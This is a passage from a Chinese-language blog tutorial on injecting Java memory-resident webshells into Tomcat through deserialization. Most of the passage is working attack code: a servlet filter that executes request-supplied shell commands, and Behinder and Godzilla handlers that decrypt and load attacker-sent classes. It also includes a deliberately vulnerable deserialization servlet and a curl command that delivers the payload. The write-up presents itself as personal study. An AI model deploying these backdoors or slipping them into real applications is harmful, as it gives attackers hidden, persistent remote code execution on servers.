                         FilterChain filterChain) throws IOException, ServletException {
        // System.out.println("TomcatShellInject doFilter..........");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
```

### 接入冰蝎

只需要在我们重写的`doFilter`部分多加一个if来适配冰蝎流量的逻辑即可接入冰蝎，代码部分详细分析参见Y4er师傅的[Java反序列化注入冰蝎内存马相关踩坑笔记](https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/)

```java
// omit
else {
    HttpServletRequest request = (HttpServletRequest) servletRequest;
    HttpServletResponse response = (HttpServletResponse) servletResponse;
    HttpSession session = request.getSession();

    // create pageContext
    HashMap pageContext = new HashMap();
    pageContext.put("request", request);
    pageContext.put("response", response);
    pageContext.put("session", session);

    if(request.getMethod().equals("POST")){
        // 这里的判断条件可自行修改
        if(request.getHeader("Referer").equalsIgnoreCase("https://www.baidu.com/")){
            try{
                String k = "e45e329feb5d925b";	// default: pass=beyond, k=md5(pass)[:16]
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
                return;
            }catch (Exception e){
                // e.printStackTrace();
            }
        }
    }
}
```

写一个反序列化接口来测试一下效果

```java
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;

@WebServlet("/cc")
public class CCServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        InputStream inputStream = (InputStream) req;
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        try {
            objectInputStream.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        resp.getWriter().write("Success");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        InputStream inputStream = req.getInputStream();
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        try {
            objectInputStream.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        resp.getWriter().write("Success");
    }
}
```

先编译TomcatInject.java，再运行CC11Template，生成的ser文件就是最终payload

```bash
# 虽然我把三梦师傅的TomcatEcho和TomcatInject和在一起了 但注意数据包仍然需要发送两次
curl "http://127.0.0.1:8088/cc" --data-binary "@./cc11Test4.ser"
```

![image-20220602204040825](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602204040825.png)

![image-20220602204148346](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602204148346.png)

### 接入哥斯拉

哥斯拉的流量比冰蝎的简单多了，加密内容在参数pass中 以post方式发出，详细分析参见Y4er师傅的[解决哥斯拉内存马pagecontext的问题](https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/)

继续融入我们原本的filter，代码如下

```java
// omit
else if(request.getHeader("Referer").equalsIgnoreCase("https://www.sohu.com/")){
    try {
        // default: pass=pass, key=key, xc=md5(key)[:16]
        String pass = "pass";
        String xc = "3c6e0b8a9c15224a";
        String md5 = md5(pass + xc);

        System.out.println("here");

        byte[] data = base64Decode(request.getParameter(pass));
        data = x(data, false, xc);
        if(this.payload == null){	// 在类中提前声明 `Class payload;`
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defMethod.setAccessible(true);
            this.payload = (Class)defMethod.invoke(urlClassLoader, data, 0, data.length);
        }else {
            ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
            Object f = this.payload.newInstance();
            f.equals(arrOut);
            f.equals(data);
            f.equals(request);
            response.getWriter().write(md5.substring(0, 16));
            f.toString();
            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true, xc)));
            response.getWriter().write(md5.substring(16));
        }

        return;
    }catch (Exception e){
        e.printStackTrace();
    }
}
```

涉及到的几个编码工具方法

```java
public static byte[] base64Decode(String bs) throws Exception {
    byte[] value = null;
    Class base64;
    try {
        base64 = Class.forName("java.util.Base64");
        Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
        value = (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
    } catch (Exception var6) {
        try {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[])((byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    return value;
}

public static String base64Encode(byte[] bs) throws Exception {
    String value = null;
    Class base64;
    try {
        base64 = Class.forName("java.util.Base64");
        Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
        value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
    } catch (Exception var6) {
        try {
            base64 = Class.forName("sun.misc.BASE64Encoder");
            Object Encoder = base64.newInstance();
            value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    return value;
}

public static String md5(String s) {
    String ret = null;

    try {
        MessageDigest m = MessageDigest.getInstance("MD5");
        m.update(s.getBytes(), 0, s.length());
        ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
    } catch (Exception e) {
        e.printStackTrace();
    }

    return ret;
}

public byte[] x(byte[] s, boolean m, String xc) {
    try {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
        return c.doFinal(s);
    } catch (Exception e) {
        return null;
    }
}
```

测试效果

![image-20220602221346197](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602221346197.png)

成功达到预期效果


{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}

[JAVA内存马的“一生”](https://xz.aliyun.com/t/11003)

[Tomcat容器攻防笔记之JSP金蝉脱壳](https://www.anquanke.com/post/id/224698)

[Java反序列化注入冰蝎内存马相关踩坑笔记](https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/)

[解决哥斯拉内存马pagecontext的问题](https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/)

{{% /spoiler %}}